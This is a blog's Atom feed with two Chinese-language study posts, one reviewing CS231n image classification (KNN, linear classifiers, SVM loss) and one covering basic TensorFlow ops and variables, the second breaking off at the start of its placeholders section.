<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一人Code</title>
  <subtitle>写给自己的Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xinqiu.me/"/>
  <updated>2017-02-20T03:48:33.000Z</updated>
  <id>http://xinqiu.me/</id>
  
  <author>
    <name>Xin Qiu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS231n 回顾与思考(一)</title>
    <link href="http://xinqiu.me/2017/02/10/CS231n-1/"/>
    <id>http://xinqiu.me/2017/02/10/CS231n-1/</id>
    <published>2017-02-09T16:00:00.000Z</published>
    <updated>2017-02-20T03:48:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>大三上学期突然入了深度学习的坑，明明还没从机器学习CS229的坑里爬出来就先放一边去了，有空还要去把机器学习的坑填上。当初学的时候忘了做笔记，因为做MIT6.828，结果CS231n有点忘了，现在来补一补笔记。</p>
</blockquote>
<h2 id="u56FE_u50CF_u5206_u7C7B"><a href="#u56FE_u50CF_u5206_u7C7B" class="headerlink" title="图像分类"></a>图像分类</h2><p>在学习 CS231n 的一开始，先介绍了图像分类的相关知识。首先图像一般是由3个颜色通道构成(红，绿，蓝)，所以一张图片一般是个三维数组。图像分类有很多挑战，常见的是图像的拍摄点存在不同，图像的大小，物体的变形，光照影响，和背景颜色类似，同一物体的多种外形等等。所以其中有一种最简单的思路——最近邻分类器。</p>
<a id="more"></a>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<h3 id="u6700_u8FD1_u90BB_u5206_u7C7B_u5668"><a href="#u6700_u8FD1_u90BB_u5206_u7C7B_u5668" class="headerlink" title="最近邻分类器"></a>最近邻分类器</h3><p>这是一个最基础的分类器。比如，使用 CIFAR-10 这个图像数据集，这个数据集是有 10 种类型的不同图片组成。训练集中每一类都有5000张不同图像，每张图片是32x32的大小。最近邻分类器的简单思路就是判断两张图片的近似程度。这里用到了一个公式 <strong>L1 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})=\sum_{p} \left| I^p_1 - I^p_2 \right| $$ </p>
<p>两个图片对于每个像素进行相减取绝对值，然后将这些值求和，得到整个图片的 L1 距离。以下是一个4x4的例子。</p>
<p><img src="http://cs231n.github.io/assets/nneg.jpeg" alt=""></p>
<p>对于要分类的那张未知类的图像，只需要求它与训练集里其他图像的 L1 距离，找到距离最近的图像，就认为未知类的图像是这个距离最近的图像的种类。</p>
<p>对于距离的选择，还有一个公式—— <strong>L2 distance</strong>:</p>
<p>$$ d_{1} (I_{1}, I_{2})= \sqrt{\sum_{p} \left( I^p_1 - I^p_2 \right)^2} $$</p>
<h3 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h3><p>KNN 思路是找出最相似的 k 个图片的标签，然后取这 k 个中相同标签最多的那个标签。上面的 NN 其实就是 k = 1 的情况。</p>
<h3 id="u9A8C_u8BC1_u96C6"><a href="#u9A8C_u8BC1_u96C6" class="headerlink" title="验证集"></a>验证集</h3><p>对于如何确定超参数，只能通过不停的调试。为了先确定超参数以便预测测试集，可以使用验证集的思路。在训练的时候，不能用测试集来训练模型参数，那样会过拟合。使用验证集的思路是:从训练集中选取一部分当做假的测试集，通过剩余的训练集来训练模型，与假的测试集进行计算准确度，准确度最高的那个超参数可以算是较为合适的超参数。</p>
<p>之后就有一种方法，交叉验证。这是将训练集均分为几份，其中一份为测试集，剩余的作为训练集进行训练，得出准确率。将这些准确率取平均值代表平均准确率。</p>
<h3 id="u7EBF_u6027_u5206_u7C7B_u5668"><a href="#u7EBF_u6027_u5206_u7C7B_u5668" class="headerlink" title="线性分类器"></a>线性分类器</h3><p>然而用 NN 来做图片分类还是太麻烦了，所以为了简化计算量，引入了评分函数和损失函数，用来量化图片分类与真实标签的相似程度。</p>
<p>线性分类器就是 </p>
<p>$$ f(x_i, W, b) =  W x_i + b $$</p>
<p>其中 $ x_i $ 是训练集中的图片，<strong>W</strong> 是权重， <strong>b</strong> 是偏移量。对于训练集中的每一张图片，都要它的真实标签 $y_i$。所以就变成需要靠训练集的训练来调出最合适的 W 和 b，使得这个线性分类器 f 能对任意输入的一个图片进行计算操作，得到一个预测的值，预测值与真实值越近越好。</p>
<p>用一张简单的图例就是 </p>
<p><img src="http://cs231n.github.io/assets/imagemap.jpg" alt=""></p>
<p>对于 W 和 b，有一个小技巧，是将 b 添加到 W 中去，使 W 多一列，这样可以简化运算。</p>
<p><img src="http://cs231n.github.io/assets/wb.jpeg" alt=""></p>
<p>以上内容也不是很难，下面才开始有点难度。</p>
<h3 id="u635F_u5931_u51FD_u6570"><a href="#u635F_u5931_u51FD_u6570" class="headerlink" title="损失函数"></a>损失函数</h3><p>上面提到了线性分类器，同样也算是损失函数的计算。只有当 W 和 b 是调好参数的时候，才能作为分类器，不然只能作为得分函数来看。所以 $ f(x_i, W, b) $ 也就是所谓的得分函数。对于得到的得分，需要一个损失函数来量化与正确值之间的差异程度。</p>
<h3 id="u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931"><a href="#u591A_u7C7B_u652F_u6301_u5411_u91CF_u673A_u635F_u5931" class="headerlink" title="多类支持向量机损失"></a>多类支持向量机损失</h3><p>SVM的损失函数是在所有正确分类的得分和不正确分类的得分中确定出一个边界差 $\Delta$。之前提到过，第 $i$ 个数据包含图像 $x_i$ 的像素和代表正确标签的 $y_i$。就数据集 CIFAR-10 而言，类别有10种，所以 $ f(x_i, W, b) $ 计算能得出对于10个类的分别得分，正确的是在类 $i$ ，错误的类标签就是 $j$。那么对于第$j$类的得分就是第$j$个元素：$s_j = f(x_i, W)_j$。根据概念，可以得出 SVM 的损失函数</p>
<p>$$ L_{i} = \sum_{j\neq y_{i}} \max(0, s_{j} - s_{y_{i}} + \Delta) $$</p>
<p>这个函数简而言之就是给定超参数 $\Delta$ 后，所有错误类别的得分减正确类别得分加上 $\Delta$ 之和就是损失值。这里的 $max(0, -)$ 不能遗漏。$max$ 得 0 的意义代表取的超参数 $\Delta$ 是可行的，而不得 0 代表 $\Delta$ 还有点大。</p>
<p>所以使用线性得分函数 $(f(x_i; W) =  W x_i)$ 的 SVM 损失函数就是 </p>
<p>$$ L_{i}=\sum_{j\neq y_{i}} \max(0, w_{j}^{T} x_{i} - w_{y_{i}}^T x_{i} + \Delta)  $$</p>
<p>这里 $w_j$ 是 $W$ 的 第 $j$ 行变形得到的列向量。</p>
<p>所以 SVM 就是为了先计算出合适的 $\Delta$，之后就能用来分类了。下图描述了正确类与错误类之间的差距关系。</p>
<p><img src="http://cs231n.github.io/assets/margin.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      回顾当初学习CS231n的知识
    
    </summary>
    
    
      <category term="deep-learning" scheme="http://xinqiu.me/tags/deep-learning/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow for Deep Learning 2</title>
    <link href="http://xinqiu.me/2017/02/02/cs20si-2/"/>
    <id>http://xinqiu.me/2017/02/02/cs20si-2/</id>
    <published>2017-02-01T16:00:00.000Z</published>
    <updated>2017-02-10T01:13:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>笔记2: TensorFlow Ops</p>
</blockquote>
<h3 id="u4F7F_u7528_TensorBoard"><a href="#u4F7F_u7528_TensorBoard" class="headerlink" title="使用 TensorBoard"></a>使用 TensorBoard</h3><p>TensorFlow 中将常量(constants),变量(variables),运算符(operators)合称为操作(ops)。TensorFlow 是由TensorFlow, TensorBoard, TensorServing 构成。首先介绍 TensorBoard。</p>
<p>TensorBoard 是图可视化软件。</p>
<p><img src="https://www.tensorflow.org/versions/master/images/mnist_tensorboard.png" alt=""></p>
<p>当用户运行开启 TensorBoard 的 TensorFlow 程序，所有操作会输出到一个事件文件。TensorBoard 能将这些文件转为图，使模型更直观。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import tensorflow as tf</div><div class="line">a = tf.constant(2)</div><div class="line">b = tf.constant(3)</div><div class="line">x = tf.add(a, b)</div><div class="line">with tf.Session() as sess:</div><div class="line">    print sess.run(x)</div></pre></td></tr></table></figure>
<p>开启 TensorBoard 只需要在运行程序的代码前添加 </p>
<p><code>writer = tf.summary.FileWriter(logs_dir,sess.graph)</code></p>
<p>其中 logs_dir 是事件文件的存放位置，比如’./graphs’。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import tensorflow as tf</div><div class="line">a = tf.constant(2)</div><div class="line">b = tf.constant(3)</div><div class="line">x = tf.add(a, b)</div><div class="line">with tf.Session() as sess:</div><div class="line">	writer = tf.summary.FileWriter(&apos;./graphs&apos;, sess.graph)</div><div class="line">	print sess.run(x)</div><div class="line"></div><div class="line"># close the writer when you’re done using it</div><div class="line">writer.close()</div></pre></td></tr></table></figure>
<p>在执行完上述代码以后，使用 <code>tensorboard --logdir=&quot;./graphs&quot;</code>，之后打开浏览器访问 h  ttp://localhost:6006/ 就能看到以下页面。 建议使用 Chrome 访问。</p>
<p><img src="1.png" alt=""></p>
<p>点击导航上的 Graphs 可以看到</p>
<center><img src="2.png" alt=""></center>

<p>“Const” 和 “Const_1” 对应代码中的 a 和 b， “Add” 对应 x。这样很不直观，所以为了让 TensorBoard 显示 操作(ops) 的名字，可以准确定义每个变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = tf.constant([2, 2], name=&quot;a&quot;)</div><div class="line">b = tf.constant([3, 6], name=&quot;b&quot;)</div><div class="line">x = tf.add(a, b, name=&quot;add&quot;)</div></pre></td></tr></table></figure>
<p>这时候 TensorBoard 中的图就是这样：</p>
<center><img src="3.png" alt=""></center>

<p>图本身只定义了操作和操作来源，但不显示值。只有在运行session时才会去获取值。</p>
<p><code>tf.Session.run(fetches, feed_dict=None, options=None, run_metadata=None)</code></p>
<h3 id="u5E38_u91CF"><a href="#u5E38_u91CF" class="headerlink" title="常量"></a>常量</h3><p>创建标量或者张量(tensor)类型的常量。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">tf.constant(value, dtype=<span class="keyword">None</span>, shape=<span class="keyword">None</span>, name=<span class="string">'Const'</span>, verify_shape=<span class="keyword">False</span>)</div><div class="line"><span class="comment"># constant of 1d tensor (vector)</span></div><div class="line">a = tf.constant([<span class="number">2</span>, <span class="number">2</span>], name=<span class="string">"vector"</span>)</div><div class="line"><span class="comment"># constant of 2x2 tensor (matrix)</span></div><div class="line">b = tf.constant([[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">3</span>]], name=<span class="string">"b"</span>)</div></pre></td></tr></table></figure>
<p>创建由特定值构成的张量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># create a tensor of shape and all elements are zeros</div><div class="line">tf.zeros(shape, dtype=tf.float32, name=None)</div><div class="line"></div><div class="line">tf.zeros([2, 3], tf.int32) ==&gt;  [[0, 0, 0], [0, 0, 0]]</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are zeros.</div><div class="line">tf.zeros_like(input_tensor, dtype=None, name=None, optimize=True)</div><div class="line"></div><div class="line"># input_tensor is [0, 1], [2, 3], [4, 5]]</div><div class="line">tf.zeros_like(input_tensor) ==&gt; [[0, 0], [0, 0], [0, 0]]</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># create a tensor of shape and all elements are ones</div><div class="line">tf.ones(shape, dtype=tf.float32, name=None)</div><div class="line"></div><div class="line">tf.ones([2, 3], tf.int32) ==&gt;  [[1, 1, 1], [1, 1, 1]]</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># create a tensor of shape and type (unless type is specified) as the input_tensor but all elements are ones.</div><div class="line">tf.ones_like(input_tensor, dtype=None, name=None, optimize=True)</div><div class="line"></div><div class="line"># input_tensor is [0, 1], [2, 3], [4, 5]]</div><div class="line">tf.ones_like(input_tensor) ==&gt; [[1, 1], [1, 1], [1, 1]]</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># create a tensor filled with a scalar value.</div><div class="line">tf.fill(dims, value, name=None)</div><div class="line"></div><div class="line">tf.fill([2, 3], 8) ==&gt; [[8, 8], [8, 8], [8, 8]]</div></pre></td></tr></table></figure>
<p>创建常数序列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># create a sequence of  num evenlyspaced values are generated beginning at  start. If num &gt; 1, the values in the sequence increase by stop - start / num - 1, so that the last one is exactly  stop.</div><div class="line"># start, stop, num must be scalars</div><div class="line"># comparable to but slightly different from numpy.linspace</div><div class="line"># numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)</div><div class="line">tf.linspace(start, stop, num, name=None)</div><div class="line"></div><div class="line">tf.linspace(10.0, 13.0, 4, name=&quot;linspace&quot;) ==&gt; [ 10.  11.  12.  13.]</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># create a sequence of numbers that begins at start and extends by increments of delta up to but not including limit</div><div class="line"># slight different from range in Python</div><div class="line">tf.range(start, limit=None, delta=1, dtype=None, name=&apos;range&apos;)</div><div class="line"></div><div class="line"># &apos;start&apos; is 3, &apos;limit&apos; is 18, &apos;delta&apos; is 3</div><div class="line"></div><div class="line">tf.range(start, limit, delta) ==&gt; [ 3  6  9 12 15]</div><div class="line"></div><div class="line"># &apos;start&apos; is 3, &apos;limit&apos; is 1, &apos;delta&apos; is -0.5</div><div class="line"></div><div class="line">tf.range(start, limit, delta) ==&gt; [ 3.   2.5  2.   1.5]</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># &apos;limit&apos; is 5</div><div class="line">tf.range(limit) ==&gt; [0 1 2 3 4]</div></pre></td></tr></table></figure>
<p>值得注意的是，不像NumPy，TensorFlow的序列是不可迭代的</p>
<p>tf也提供了生成确定分布的随机常量的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">tf.random_normal(shape, mean=0.0, stddev=1.0, dtype=dtypes.float32, seed=None, name=None)</div><div class="line"></div><div class="line">tf.truncated_normal(shape, mean=0.0, stddev=1.0, dtype=dtypes.float32, seed=None, name=None)</div><div class="line"></div><div class="line">tf.random_uniform(shape, minval=0, maxval=None, dtype=dtypes.float32, seed=None, name=None)</div><div class="line"></div><div class="line">tf.random_shuffle(value, seed=None, name=None)</div><div class="line"></div><div class="line">tf.random_crop(value, size,seed=None, name=None)</div><div class="line"></div><div class="line">tf.multinomial(logits, num_samples, seed=None, name=None)</div><div class="line"></div><div class="line">tf.random_gamma(shape, alpha, beta=None, dtype=tf.float32, seed=None, name=None)</div></pre></td></tr></table></figure>
<h3 id="u6570_u5B66_u8FD0_u7B97"><a href="#u6570_u5B66_u8FD0_u7B97" class="headerlink" title="数学运算"></a>数学运算</h3><p>TensorFlow 的数学运算和 NumPy 非常类似。直接看 <a href="https://www.tensorflow.org/api_docs/python/math_ops/" target="_blank" rel="external">Math API</a> 吧。</p>
<h3 id="u6570_u636E_u7C7B_u578B"><a href="#u6570_u636E_u7C7B_u578B" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="Python__u539F_u751F_u7C7B_u578B"><a href="#Python__u539F_u751F_u7C7B_u578B" class="headerlink" title="Python 原生类型"></a>Python 原生类型</h4><p>看下面的例子就能懂了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">t_0 = 19  # Treated as a 0-d tensor, or &quot;scalar&quot; </div><div class="line">tf.zeros_like(t_0)  # ==&gt; 0</div><div class="line">tf.ones_like(t_0)  # ==&gt; 1</div><div class="line"></div><div class="line">t_1 = [b&quot;apple&quot;, b&quot;peach&quot;, b&quot;grape&quot;]  # treated as a 1-d tensor, or &quot;vector&quot; </div><div class="line">tf.zeros_like(t_1)  # ==&gt; [&apos;&apos; &apos;&apos; &apos;&apos;]</div><div class="line">tf.ones_like(t_1)  # ==&gt; TypeError: Expected string, got 1 of type &apos;int&apos; instead.</div><div class="line"></div><div class="line">t_2 = [[True, False, False],</div><div class="line">       [False, False, True],</div><div class="line">       [False, True, False]]  # treated as a 2-d tensor, or &quot;matrix&quot;</div><div class="line">tf.zeros_like(t_2)  # ==&gt; 2x2 tensor, all elements are False</div><div class="line">tf.ones_like(t_2)  # ==&gt; 2x2 tensor, all elements are True</div></pre></td></tr></table></figure>
<h4 id="TensorFlow__u539F_u751F_u7C7B_u578B"><a href="#TensorFlow__u539F_u751F_u7C7B_u578B" class="headerlink" title="TensorFlow 原生类型"></a>TensorFlow 原生类型</h4><p>TensorFlow 有自己的数据类型，比如tf.int32, tf.float32。更多详情<a href="https://www.tensorflow.org/versions/r0.11/resources/dims_types#data_types" target="_blank" rel="external">Data types</a></p>
<h4 id="NumPy__u6570_u636E_u7C7B_u578B"><a href="#NumPy__u6570_u636E_u7C7B_u578B" class="headerlink" title="NumPy 数据类型"></a>NumPy 数据类型</h4><p>TensorFlow 被设计成与 Numpy 兼容，所以 TensorFlow 的数据类型是基于 NumPy 的，甚至 np.int32 == tf.int32 返回 True。所以可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tf.ones([2, 2], np.float32) == &gt; [[1.0 1.0], [1.0 1.0]]</div></pre></td></tr></table></figure>
<p>长话短说，TensorFlow 类型和 NumPy 类型可以互相转换，但 TensorFlow 优点更多。</p>
<h3 id="u53D8_u91CF"><a href="#u53D8_u91CF" class="headerlink" title="变量"></a>变量</h3><p>变量被赋值以后还是可以改变，与值储存在 图 中的常量不同，变量是分开的，可能存在参数服务器上。</p>
<p>关于 图 的定义和 图 所包含的内容可以靠打印 图 的 protobuf(Protocol Buffers，是Google公司开发的一种数据描述语言)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import tensorflow as tf</div><div class="line"></div><div class="line">my_const = tf.constant([1.0, 2.0], name=&quot;my_const&quot;)</div><div class="line">print tf.get_default_graph().as_graph_def()</div></pre></td></tr></table></figure>
<p>输出就 protobuf。</p>
<h4 id="u58F0_u660E_u53D8_u91CF"><a href="#u58F0_u660E_u53D8_u91CF" class="headerlink" title="声明变量"></a>声明变量</h4><p>声明变量需要通过实例化 tf.Variable。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># create variable a with scalar value</div><div class="line">a = tf.Variable(2, name=&quot;scalar&quot;)</div><div class="line"># create variable b as a vector</div><div class="line">b = tf.Variable([2, 3], name=&quot;vector&quot;)</div><div class="line"># create variable c as a 2x2 matrix</div><div class="line">c = tf.Variable([[0, 1], [2, 3]], name=&quot;matrix&quot;)</div><div class="line"># create variable W as 784 x 10 tensor, filled with zeros</div><div class="line">W = tf.Variable(tf.zeros([784, 10]))</div></pre></td></tr></table></figure>
<p>tf.Variable 支持以下几个操作:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = tf.Variable(...)</div><div class="line">x.initializer # init </div><div class="line">x.value() # read op </div><div class="line">x.assign(...) # write op </div><div class="line">x.assign_add(...)</div><div class="line"># and more</div></pre></td></tr></table></figure>
<p><strong>在使用变量之前必须初始化</strong>。使用 tf.global_variables_initializer() 可以非常简单的初始化所有变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">init = tf.global_variables_initializer()</div><div class="line"></div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(init)</div></pre></td></tr></table></figure>
<p>也可以使用 tf.Variable.initializer 初始化每个变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># create variable W as 784 x 10 tensor, filled with zeros</div><div class="line">W = tf.Variable(tf.zeros([784, 10]))</div><div class="line">with tf.Session() as sess:</div><div class="line">    tf.run(W.initializer)</div></pre></td></tr></table></figure>
<h4 id="u6C42_u53D8_u91CF_u7684_u503C"><a href="#u6C42_u53D8_u91CF_u7684_u503C" class="headerlink" title="求变量的值"></a>求变量的值</h4><p>如果仅打印初始化的变量，得到的是 tensor 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># W is a random 700 x 100 variable object</div><div class="line">W = tf.Variable(tf.truncated_normal([700, 10]))</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(W.initializer)</div><div class="line">    print W</div></pre></td></tr></table></figure>
<p>为了得到变量的值，需要用求值函数eval()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># W is a random 700 x 100 variable object</div><div class="line">W = tf.Variable(tf.truncated_normal([700, 10]))</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(W.initializer)</div><div class="line">    print W.eval()</div></pre></td></tr></table></figure>
<h4 id="u8D4B_u503C"><a href="#u8D4B_u503C" class="headerlink" title="赋值"></a>赋值</h4><p>使用 tf.Variable.assign() 来给变量分配值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">W = tf.Variable(10)</div><div class="line">W.assign(100)</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(W.initializer)</div><div class="line">    print W.eval()</div></pre></td></tr></table></figure>
<p>然而上面代码的结果还是10，为什么呢？</p>
<p>因为上面的 assign 只是一个操作，并没有去执行。需要在 session 里运行这个操作才能让其有作用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">W = tf.Variable(10)</div><div class="line">assign_op = W.assign(100)</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(assign_op)</div><div class="line">    print W.eval()</div></pre></td></tr></table></figure>
<p>这里没进行初始化，是因为 assgin 替我们完成了初始化的操作。其实初始化操作也是一种赋值操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># create a variable whose original value is 2</div><div class="line">a = tf.Variable(2, name=&quot;scalar&quot;)</div><div class="line"># assign a * 2 to a and call that op a_times_two</div><div class="line">a_times_two = a.assign(a * 2)</div><div class="line">init = tf.global_variables_initializer()</div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(init)</div><div class="line">    # have to initialize a, because a_times_two op depends on the value of a</div><div class="line">    print sess.run(a_times_two)  # &gt;&gt; 4</div><div class="line">    print sess.run(a_times_two)  # &gt;&gt; 8</div><div class="line">    print sess.run(a_times_two)  # &gt;&gt; 16</div></pre></td></tr></table></figure>
<p>TensorFlow 每次 a_times_two 都会将 a 乘 2。</p>
<p>对于简单的加减，TensorFlow 提供了 tf.Variable.assign_add() 和 tf.Variable.assign_sub() 方法。要注意的是，这两个方法不会初始化变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">W = tf.Variable(10)</div><div class="line"></div><div class="line">with tf.Session() as sess:</div><div class="line">    sess.run(W.initializer)</div><div class="line">    print sess.run(W.assign_add(10))</div><div class="line">    print sess.run(W.assign_sub(2))</div></pre></td></tr></table></figure>
<p>TensorFlow 的每个 session 维护各自的值。</p>
<p>当然 变量 可以基于其他 变量 。 比如声明 U = W * 2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># W is a random 700 x 100 tensor</div><div class="line">W = tf.Variable(tf.truncated_normal([700, 10]))</div><div class="line">U = tf.Variable(W * 2)</div></pre></td></tr></table></figure>
<p>当然这里最好确保W要先初始化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U = tf.Variable(W.initial_value() * 2)</div></pre></td></tr></table></figure>
<h4 id="InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29"><a href="#InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29" class="headerlink" title="InteractiveSession(交互式会话)"></a>InteractiveSession(交互式会话)</h4><p>InteractiveSession 与 Session 不同的地方在于前者会将其本身作为默认的会话，所以之后调用 run() 或 eval() 可以不用指明会话。虽然很方便，但如果有多个会话就很麻烦。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sess = tf.InteractiveSession()</div><div class="line">a = tf.constant(5.0)</div><div class="line">b = tf.constant(6.0)</div><div class="line">c = a * b</div><div class="line"># We can just use &apos;c.eval()&apos; without passing &apos;sess&apos;</div><div class="line">print c.eval()</div><div class="line">sess.close()</div></pre></td></tr></table></figure>
<p>tf.get_default_session() 返回当前线程的默认会话。</p>
<h4 id="Control_Dependencies"><a href="#Control_Dependencies" class="headerlink" title="Control Dependencies"></a>Control Dependencies</h4><p>如果有两个独立操作，想指明哪个操作先执行，可以使用 tf.Graph.control_dependencies(control_inputs)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># your graph g have 5 ops: a, b, c, d, e </div><div class="line">with g.control_dependencies([a, b, c]):</div><div class="line">    # `d` and `e` will only run after `a`, `b`, and `c` have executed. </div><div class="line">    d = ...</div><div class="line">    e = ...</div></pre></td></tr></table></figure>
<h4 id="Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict"><a href="#Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict" class="headerlink" title="Placeholders(占位符) 和 feed_dict"></a>Placeholders(占位符) 和 feed_dict</h4><p>TensorFlow 程序通常有两个时期：</p>
<ol>
<li>构造一个 图</li>
<li>在 图 里使用 会话 执行 操作</li>
</ol>
<p>所以在构造 图 的时候，可以不需要知道计算的具体值，类似于定义一个函数。比如 f(x, y) = x*2 + y，x,y 就是 Placeholders(占位符) 。</p>
<p>定义占位符</p>
